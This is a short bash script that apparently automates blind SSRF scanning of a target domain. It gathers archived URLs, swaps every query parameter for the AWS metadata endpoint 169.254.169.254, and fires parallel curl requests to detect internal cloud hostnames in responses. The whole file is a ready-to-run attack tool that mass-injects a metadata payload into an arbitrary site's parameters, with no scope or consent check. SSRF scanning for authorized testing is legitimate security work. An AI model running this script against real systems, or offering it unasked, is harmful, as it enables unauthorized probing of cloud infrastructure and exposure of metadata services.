#!/bin/bash

target=$1

echo "Getting waybackurls..."
waybackurls $target >> blindssrftesturl.txt
echo "Getting all urls..."
gau $target >> blindssrftesturl.txt

echo "Testing for ssrf vulnerabilities..."
cat blindssrftesturl.txt | sort -u | anew | httpx | qsreplace 'http://169.254.169.254/latest/meta-data/hostname' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF Vuln %"'

echo "Scanning complete."
